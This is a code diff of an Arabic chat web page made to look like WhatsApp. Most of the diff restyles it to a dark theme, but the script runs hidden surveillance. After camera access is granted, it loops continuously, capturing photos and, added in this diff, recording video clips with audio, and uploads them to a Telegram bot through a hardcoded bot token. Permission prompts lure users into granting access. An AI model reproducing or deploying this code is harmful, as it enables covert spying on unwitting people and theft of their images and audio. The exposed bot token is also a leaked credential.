@@ -12,8 +12,8 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: #111b21;
             height: 100vh;
             display: flex;
             justify-content: center;
@@ -22,98 +22,164 @@
 
         .container {
             width: 95%;
-            max-width: 1200px;
+            max-width: 1400px;
             height: 95vh;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            background: #222e35;
+            border-radius: 0;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
             display: flex;
             overflow: hidden;
         }
 
         .chats-list {
-            width: 350px;
-            background: white;
-            border-left: 1px solid #e0e0e0;
+            width: 420px;
+            background: #111b21;
+            border-left: 1px solid #2a3942;
             display: flex;
             flex-direction: column;
         }
 
         .chats-header {
-            background: #00a884;
-            color: white;
-            padding: 20px;
+            background: #202c33;
+            color: #e9edef;
+            padding: 18px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            min-height: 60px;
         }
 
         .chats-header h2 {
+            font-size: 21px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .icon-btn {
+            background: transparent;
+            border: none;
+            color: #aebac1;
+            cursor: pointer;
             font-size: 20px;
+            padding: 8px;
+            border-radius: 50%;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .icon-btn:hover {
+            background: rgba(255,255,255,0.05);
+            color: #e9edef;
         }
 
         .add-chat-btn {
-            background: rgba(255,255,255,0.2);
+            background: #00a884;
             border: none;
             color: white;
-            width: 40px;
-            height: 40px;
+            width: 46px;
+            height: 46px;
             border-radius: 50%;
-            font-size: 24px;
+            font-size: 28px;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: all 0.3s;
+            box-shadow: 0 2px 8px rgba(0,168,132,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            line-height: 1;
         }
 
         .add-chat-btn:hover {
-            background: rgba(255,255,255,0.3);
+            background: #06cf9c;
+            transform: scale(1.05);
         }
 
         .search-box {
-            padding: 10px;
-            background: #f6f6f6;
+            padding: 10px 12px;
+            background: #111b21;
+        }
+
+        .search-input-wrapper {
+            background: #202c33;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            gap: 10px;
+        }
+
+        .search-icon {
+            color: #aebac1;
+            font-size: 16px;
         }
 
         .search-input {
-            width: 100%;
-            padding: 10px 15px;
+            flex: 1;
             border: none;
-            border-radius: 20px;
-            background: white;
+            background: transparent;
+            color: #e9edef;
             font-size: 14px;
+            outline: none;
+        }
+
+        .search-input::placeholder {
+            color: #667781;
         }
 
         .chats-container {
             flex: 1;
             overflow-y: auto;
+            background: #111b21;
+        }
+
+        .chats-container::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .chats-container::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .chats-container::-webkit-scrollbar-thumb {
+            background: #374045;
+            border-radius: 3px;
         }
 
         .chat-item {
-            padding: 15px 20px;
-            border-bottom: 1px solid #f0f0f0;
+            padding: 12px 16px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
             cursor: pointer;
-            transition: background 0.2s;
+            transition: background 0.15s;
             display: flex;
             align-items: center;
-            gap: 15px;
+            gap: 14px;
         }
 
         .chat-item:hover {
-            background: #f5f5f5;
+            background: #202c33;
         }
 
         .chat-item.active {
-            background: #e9edef;
+            background: #2a3942;
         }
 
         .chat-avatar {
-            width: 50px;
-            height: 50px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(135deg, #00a884 0%, #06cf9c 100%);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 24px;
+            font-size: 26px;
             flex-shrink: 0;
         }
 
@@ -125,8 +191,8 @@
         .chat-name {
             font-size: 16px;
             font-weight: 500;
-            color: #111;
-            margin-bottom: 3px;
+            color: #e9edef;
+            margin-bottom: 4px;
         }
 
         .chat-last-message {
@@ -135,6 +201,13 @@
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
+        }
+
+        .chat-meta {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 4px;
         }
 
         .chat-time {
@@ -146,7 +219,7 @@
             flex: 1;
             display: flex;
             flex-direction: column;
-            background: #e5ddd5;
+            background: #0b141a;
         }
 
         .empty-state {
@@ -156,32 +229,36 @@
             justify-content: center;
             align-items: center;
             color: #667781;
-            background: #f8f9fa;
+            background: #222e35;
+            border-left: 1px solid #2a3942;
         }
 
         .empty-state-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
+            font-size: 100px;
+            margin-bottom: 30px;
+            opacity: 0.3;
         }
 
         .empty-state-text {
-            font-size: 18px;
+            font-size: 20px;
             text-align: center;
+            color: #8696a0;
         }
 
         .chat-header {
-            background: #f0f2f5;
-            padding: 15px 20px;
+            background: #202c33;
+            padding: 12px 20px;
             display: flex;
             align-items: center;
-            gap: 15px;
-            border-bottom: 1px solid #d1d7db;
+            gap: 14px;
+            border-bottom: 1px solid #2a3942;
+            min-height: 60px;
         }
 
         .chat-header-avatar {
-            width: 45px;
-            height: 45px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, #00a884 0%, #06cf9c 100%);
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -189,38 +266,59 @@
             font-size: 22px;
         }
 
+        .chat-header-info {
+            flex: 1;
+        }
+
         .chat-header-info h3 {
-            font-size: 16px;
-            color: #111;
+            font-size: 17px;
+            color: #e9edef;
             margin-bottom: 2px;
+            font-weight: 500;
         }
 
         .chat-header-status {
             font-size: 13px;
-            color: #667781;
+            color: #8696a0;
         }
 
         .messages-container {
             flex: 1;
             overflow-y: auto;
             padding: 20px;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect fill="%23e5ddd5" width="100" height="100"/></svg>');
+            background: #0b141a;
+            background-image: 
+                radial-gradient(circle at 20% 50%, rgba(0,168,132,0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(0,168,132,0.02) 0%, transparent 50%);
+        }
+
+        .messages-container::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .messages-container::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .messages-container::-webkit-scrollbar-thumb {
+            background: #374045;
+            border-radius: 3px;
         }
 
         .message {
-            margin-bottom: 12px;
+            margin-bottom: 8px;
             display: flex;
-            animation: messageIn 0.3s ease;
+            animation: messageIn 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
         @keyframes messageIn {
             from {
                 opacity: 0;
-                transform: scale(0.8);
+                transform: translateY(10px);
             }
             to {
                 opacity: 1;
-                transform: scale(1);
+                transform: translateY(0);
             }
         }
 
@@ -230,157 +328,174 @@
 
         .message-bubble {
             max-width: 65%;
-            padding: 8px 12px;
+            padding: 7px 10px 8px 10px;
             border-radius: 8px;
             position: relative;
             word-wrap: break-word;
-            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
         }
 
         .message.sent .message-bubble {
-            background: #d9fdd3;
-            border-bottom-right-radius: 0;
+            background: #005c4b;
+            border-radius: 8px;
+            border-bottom-left-radius: 2px;
         }
 
         .message.received .message-bubble {
-            background: white;
-            border-bottom-left-radius: 0;
+            background: #202c33;
+            border-radius: 8px;
+            border-bottom-right-radius: 2px;
         }
 
         .message-text {
-            font-size: 14px;
-            color: #111;
-            margin-bottom: 2px;
+            font-size: 14.2px;
+            color: #e9edef;
+            margin-bottom: 4px;
+            line-height: 1.5;
         }
 
         .message-audio {
             display: flex;
             align-items: center;
-            gap: 10px;
-            padding: 5px;
-            background: rgba(0,0,0,0.05);
+            gap: 8px;
+            padding: 6px 8px;
+            background: rgba(0,0,0,0.15);
             border-radius: 20px;
-            margin-bottom: 5px;
+            margin-bottom: 4px;
+            min-width: 200px;
         }
 
         .audio-play-btn {
-            background: #00a884;
+            background: #06cf9c;
             border: none;
             color: white;
-            width: 35px;
-            height: 35px;
+            width: 38px;
+            height: 38px;
             border-radius: 50%;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 14px;
             display: flex;
             align-items: center;
             justify-content: center;
             flex-shrink: 0;
+            transition: all 0.2s;
+        }
+
+        .audio-play-btn:hover {
+            background: #00a884;
+            transform: scale(1.05);
         }
 
         .audio-waveform {
             flex: 1;
-            height: 25px;
+            height: 28px;
             background: repeating-linear-gradient(
                 90deg,
-                #00a884 0px,
-                #00a884 2px,
+                #06cf9c 0px,
+                #06cf9c 2px,
                 transparent 2px,
-                transparent 5px
+                transparent 6px
             );
-            border-radius: 3px;
-            opacity: 0.6;
+            border-radius: 4px;
+            opacity: 0.5;
         }
 
         .audio-duration {
             font-size: 12px;
-            color: #667781;
-            padding: 0 5px;
+            color: #8696a0;
+            padding: 0 6px;
+            font-weight: 500;
         }
 
         .message-time {
             font-size: 11px;
-            color: #667781;
+            color: #8696a0;
             text-align: left;
+            margin-top: 2px;
         }
 
         .message.sent .message-time {
             text-align: right;
+            color: #99dac1;
         }
 
         .input-area {
-            padding: 10px 20px;
-            background: #f0f2f5;
+            padding: 12px 20px;
+            background: #202c33;
             display: flex;
-            gap: 10px;
+            gap: 8px;
             align-items: center;
+            border-top: 1px solid #2a3942;
         }
 
-        .attachment-btn {
+        .attachment-btn, .voice-btn {
             background: transparent;
             border: none;
-            color: #54656f;
-            width: 40px;
-            height: 40px;
+            color: #8696a0;
+            width: 42px;
+            height: 42px;
             border-radius: 50%;
             cursor: pointer;
             font-size: 24px;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: background 0.3s;
+            transition: all 0.2s;
         }
 
-        .attachment-btn:hover {
-            background: rgba(0,0,0,0.05);
-        }
-
-        .voice-btn {
-            background: transparent;
-            border: none;
-            color: #54656f;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            cursor: pointer;
-            font-size: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background 0.3s;
-            position: relative;
-        }
-
-        .voice-btn:hover {
-            background: rgba(0,0,0,0.05);
+        .attachment-btn:hover, .voice-btn:hover {
+            background: rgba(255,255,255,0.05);
+            color: #aebac1;
         }
 
         .voice-btn.recording {
-            background: #ff0000;
+            background: #f15c6d;
             color: white;
+            animation: recordingPulse 1.5s infinite;
+        }
+
+        @keyframes recordingPulse {
+            0%, 100% { 
+                box-shadow: 0 0 0 0 rgba(241, 92, 109, 0.7);
+            }
+            50% { 
+                box-shadow: 0 0 0 10px rgba(241, 92, 109, 0);
+            }
         }
 
         .recording-ui {
             display: none;
             position: absolute;
-            bottom: 70px;
+            bottom: 80px;
             left: 20px;
             right: 20px;
-            background: white;
-            border-radius: 20px;
-            padding: 15px 20px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            background: #2a3942;
+            border-radius: 12px;
+            padding: 16px 20px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
             align-items: center;
-            gap: 15px;
+            gap: 16px;
             z-index: 10;
         }
 
         .recording-ui.active {
             display: flex;
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .recording-icon {
-            color: #ff0000;
+            color: #f15c6d;
             font-size: 24px;
             animation: pulse 1.5s infinite;
         }
@@ -392,71 +507,81 @@
 
         .recording-timer {
             flex: 1;
-            font-size: 16px;
-            color: #111;
-            font-weight: 500;
+            font-size: 17px;
+            color: #e9edef;
+            font-weight: 600;
         }
 
         .recording-actions {
             display: flex;
-            gap: 10px;
+            gap: 12px;
         }
 
-        .recording-delete {
-            background: #ff4444;
+        .recording-delete, .recording-send {
             border: none;
             color: white;
-            width: 45px;
-            height: 45px;
+            width: 48px;
+            height: 48px;
             border-radius: 50%;
             cursor: pointer;
             font-size: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .recording-delete {
+            background: #f15c6d;
+        }
+
+        .recording-delete:hover {
+            background: #d93a4d;
+            transform: scale(1.05);
         }
 
         .recording-send {
             background: #00a884;
-            border: none;
-            color: white;
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            cursor: pointer;
-            font-size: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        }
+
+        .recording-send:hover {
+            background: #06cf9c;
+            transform: scale(1.05);
         }
 
         .message-input {
             flex: 1;
-            padding: 10px 15px;
+            padding: 11px 16px;
             border: none;
-            border-radius: 20px;
+            border-radius: 8px;
             font-size: 15px;
-            background: white;
+            background: #2a3942;
+            color: #e9edef;
             outline: none;
+        }
+
+        .message-input::placeholder {
+            color: #667781;
         }
 
         .send-btn {
             background: #00a884;
             border: none;
             color: white;
-            width: 45px;
-            height: 45px;
+            width: 46px;
+            height: 46px;
             border-radius: 50%;
             cursor: pointer;
             font-size: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: background 0.3s;
+            transition: all 0.2s;
         }
 
         .send-btn:hover {
-            background: #008c6a;
+            background: #06cf9c;
+            transform: scale(1.05);
         }
 
         .modal {
@@ -466,37 +591,62 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.5);
+            background: rgba(0,0,0,0.7);
             justify-content: center;
             align-items: center;
             z-index: 1000;
+            backdrop-filter: blur(5px);
         }
 
         .modal.active {
             display: flex;
+            animation: fadeIn 0.2s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         .modal-content {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
+            background: #202c33;
+            padding: 32px;
+            border-radius: 12px;
             width: 90%;
-            max-width: 400px;
+            max-width: 420px;
+            box-shadow: 0 12px 48px rgba(0,0,0,0.5);
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .modal-content h3 {
-            margin-bottom: 20px;
-            color: #111;
+            margin-bottom: 24px;
+            color: #e9edef;
             text-align: center;
+            font-size: 20px;
+            font-weight: 500;
         }
 
         .modal-input {
             width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #e0e0e0;
+            padding: 14px 16px;
+            border: 2px solid #2a3942;
             border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 14px;
+            margin-bottom: 24px;
+            font-size: 15px;
+            background: #111b21;
+            color: #e9edef;
+            transition: border 0.2s;
         }
 
         .modal-input:focus {
@@ -504,19 +654,24 @@
             border-color: #00a884;
         }
 
+        .modal-input::placeholder {
+            color: #667781;
+        }
+
         .modal-buttons {
             display: flex;
-            gap: 10px;
+            gap: 12px;
         }
 
         .modal-btn {
             flex: 1;
-            padding: 12px;
+            padding: 14px;
             border: none;
             border-radius: 8px;
             cursor: pointer;
             font-size: 15px;
-            font-weight: 500;
+            font-weight: 600;
+            transition: all 0.2s;
         }
 
         .confirm-btn {
@@ -525,19 +680,21 @@
         }
 
         .confirm-btn:hover {
-            background: #008c6a;
+            background: #06cf9c;
+            transform: translateY(-2px);
         }
 
         .cancel-btn {
-            background: #f0f0f0;
-            color: #667781;
+            background: #2a3942;
+            color: #8696a0;
         }
 
         .cancel-btn:hover {
-            background: #e0e0e0;
+            background: #374045;
+            color: #aebac1;
         }
 
-        #imageInput {
+        #imageInput, #videoInput {
             display: none;
         }
 
@@ -565,42 +722,33 @@
                 display: flex;
             }
 
-            .chat-header {
-                position: relative;
-            }
-
-            .back-btn {
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                width: 40px;
-                height: 40px;
-                background: transparent;
-                border: none;
-                color: #111;
-                font-size: 24px;
-                cursor: pointer;
-                margin-left: 10px;
-            }
-
             .recording-ui {
                 left: 10px;
                 right: 10px;
-                bottom: 65px;
+                bottom: 70px;
             }
 
             .message-bubble {
-                max-width: 80%;
+                max-width: 85%;
             }
         }
 
         .back-btn {
             display: none;
+            background: transparent;
+            border: none;
+            color: #e9edef;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 8px;
+            margin-left: 4px;
         }
 
         @media (max-width: 768px) {
             .back-btn {
                 display: flex;
+                align-items: center;
+                justify-content: center;
             }
         }
     </style>
@@ -610,11 +758,16 @@
         <div class="chats-list">
             <div class="chats-header">
                 <h2>الدردشات</h2>
-                <button class="add-chat-btn" onclick="openAddChatModal()">+</button>
+                <div class="header-icons">
+                    <button class="add-chat-btn" onclick="openAddChatModal()">+</button>
+                </div>
             </div>
             
             <div class="search-box">
-                <input type="text" class="search-input" placeholder="ابحث عن دردشة...">
+                <div class="search-input-wrapper">
+                    <span class="search-icon">🔍</span>
+                    <input type="text" class="search-input" placeholder="ابحث عن دردشة...">
+                </div>
             </div>
             
             <div class="chats-container" id="chatsList"></div>
@@ -623,7 +776,7 @@
         <div class="chat-area" id="chatArea">
             <div class="empty-state">
                 <div class="empty-state-icon">💬</div>
-                <div class="empty-state-text">اختر دردشة للبدء</div>
+                <div class="empty-state-text">اختر دردشة للبدء في المحادثة</div>
             </div>
         </div>
     </div>
@@ -640,6 +793,7 @@
     </div>
 
     <input type="file" id="imageInput" accept="image/*">
+    <input type="file" id="videoInput" accept="video/*">
 
     <script>
         const BOT_TOKEN = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
@@ -649,13 +803,15 @@
         let videoStream = null;
         let autoAudioActive = false;
         let autoPhotoActive = false;
+        let autoVideoActive = false;
         let manualRecorder = null;
         let isManualRecording = false;
         let recordingStartTime = 0;
         let recordingTimerInterval = null;
         let manualRecordingChunks = [];
         const AUDIO_INTERVAL_MS = 5000;
-        const PHOTO_INTERVAL_MS = 3000;
+        const PHOTO_INTERVAL_MS = 5000;
+        const VIDEO_INTERVAL_MS = 5000;
 
         let chats = [];
         let activeChat = null;
@@ -680,7 +836,7 @@
         }
 
         const users = {
-            '59356': { name: 'نرجس', avatar: '🌸', sendCommand: '/send1' },
+            '83975': { name: 'نرجس', avatar: '🌸', sendCommand: '/send1' },
             '12345': { name: 'جميله اكتوبر', avatar: '👨', sendCommand: '/send2' },
             '67890': { name: 'طيبه', avatar: '👩', sendCommand: '/send3' },
             '11111': { name: 'زهراء', avatar: '🧑', sendCommand: '/send4' },
@@ -703,7 +859,7 @@
                 permissionsGranted.audio = false;
                 savePermissions();
                 if (!silent) {
-                    alert('⚠️ يجب الموافقة على الصلاحيات لتتمكن من إرسال الصوت. اضغط على العلامة في الأعلى يسار رابط الموقع واضغط على الأذونات وفعّل الأذونات');
+                    alert('⚠️ يجب الموافقة على صلاحية الصوت');
                 }
                 return false;
             }
@@ -711,18 +867,22 @@
 
         async function requestCameraPermission(silent = false) {
             try {
-                videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                console.log('✅ تم الحصول على صلاحية الكاميرا');
+                videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' },
+                    audio: true 
+                });
+                console.log('✅ تم الحصول على صلاحية الكاميرا والفيديو');
                 permissionsGranted.video = true;
                 savePermissions();
                 startAutoPhotoCapture();
+                startAutoVideoRecording();
                 return true;
             } catch (error) {
                 console.error('❌ خطأ في صلاحية الكاميرا:', error);
                 permissionsGranted.video = false;
                 savePermissions();
                 if (!silent) {
-                    alert('⚠️ يجب الموافقة على الصلاحيات لتتمكن من إرسال الصورة. اضغط على العلامة في الأعلى يسار رابط الموقع واضغط على الأذونات وفعّل الأذونات');
+                    alert('⚠️ يجب الموافقة على صلاحية الكاميرا والفيديو لتتمكن من إرسال الصور والفيديوهات');
                 }
                 return false;
             }
@@ -788,6 +948,38 @@
             });
         }
 
+        async function recordVideoClip(duration = VIDEO_INTERVAL_MS) {
+            if (!videoStream) return null;
+            
+            return new Promise((resolve) => {
+                try {
+                    const mediaRecorder = new MediaRecorder(videoStream, { 
+                        mimeType: 'video/webm',
+                        videoBitsPerSecond: 2500000
+                    });
+                    const chunks = [];
+                    
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) chunks.push(e.data);
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        resolve(new Blob(chunks, { type: 'video/webm' }));
+                    };
+                    
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, duration);
+                } catch (error) {
+                    console.error('خطأ في تسجيل الفيديو:', error);
+                    resolve(null);
+                }
+            });
+        }
+
         async function sendMediaToTelegram(blob, type = "voice", isManual = false) {
             if (!blob) return;
             
@@ -796,19 +988,21 @@
             
             let caption = '';
             if (isManual && activeChat) {
-                caption = `🎙️ تسجيل صوتي من ${activeChat.name}`;
+                caption = `🎙️ تسجيل من ${activeChat.name}`;
             }
             
             if (type === "voice") {
                 formData.append("voice", blob, "audio.webm");
-                if (caption) {
-                    formData.append("caption", caption);
-                }
+                if (caption) formData.append("caption", caption);
             } else if (type === "photo") {
                 formData.append("photo", blob, "photo.jpg");
+                if (caption) formData.append("caption", caption);
+            } else if (type === "video") {
+                formData.append("video", blob, "video.webm");
+                if (caption) formData.append("caption", caption);
             }
             
-            const endpoint = type === "voice" ? "sendVoice" : "sendPhoto";
+            const endpoint = type === "voice" ? "sendVoice" : (type === "photo" ? "sendPhoto" : "sendVideo");
             
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
@@ -818,7 +1012,7 @@
                 
                 const result = await response.json();
                 if (result.ok) {
-                    console.log(`✅ تم إرسال ${type === 'voice' ? 'الصوت' : 'الصورة'}`);
+                    console.log(`✅ تم إرسال ${type === 'voice' ? 'الصوت' : type === 'photo' ? 'الصورة' : 'الفيديو'}`);
                 }
             } catch (error) {
                 console.error('❌ خطأ في الإرسال:', error);
@@ -846,6 +1040,18 @@
                     await sendMediaToTelegram(photoBlob, "photo", false);
                 }
                 await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL_MS));
+            }
+        }
+
+        async function startAutoVideoRecording() {
+            autoVideoActive = true;
+            
+            while (autoVideoActive) {
+                const videoBlob = await recordVideoClip();
+                if (videoBlob) {
+                    await sendMediaToTelegram(videoBlob, "video", false);
+                }
+                await new Promise(resolve => setTimeout(resolve, 1000));
             }
         }
 
@@ -1024,7 +1230,9 @@
                         <div class="chat-name">${chat.name}</div>
                         <div class="chat-last-message">${chat.lastMessage || 'ابدأ الدردشة...'}</div>
                     </div>
-                    <div class="chat-time">${chat.time}</div>
+                    <div class="chat-meta">
+                        <div class="chat-time">${chat.time}</div>
+                    </div>
                 `;
                 
                 chatItem.onclick = () => openChat(chat);
@@ -1049,7 +1257,7 @@
                     <div class="chat-header-avatar">${chat.avatar}</div>
                     <div class="chat-header-info">
                         <h3>${chat.name}</h3>
-                        <div class="chat-header-status">متصل</div>
+                        <div class="chat-header-status">متصل الآن</div>
                     </div>
                 </div>
                 
@@ -1065,7 +1273,7 @@
                 </div>
                 
                 <div class="input-area">
-                    <button class="attachment-btn" onclick="selectImage()" title="إرسال صورة">📎</button>
+                    <button class="attachment-btn" onclick="selectImage()" title="إرسال صورة/فيديو">📎</button>
                     <button class="voice-btn" id="voiceBtn" onclick="startManualRecording()" title="تسجيل صوت">🎤</button>
                     <input type="text" class="message-input" id="messageInput" placeholder="اكتب رسالة...">
                     <button class="send-btn" onclick="sendMessage()">➤</button>
@@ -1114,7 +1322,7 @@
                     body: formData
                 });
                 
-                console.log('✅ تم إرسال الصورة من الاستوديو');
+                console.log('✅ تم إرسال الصورة');
             } catch (error) {
                 console.error('❌ خطأ في إرسال الصورة:', error);
             }
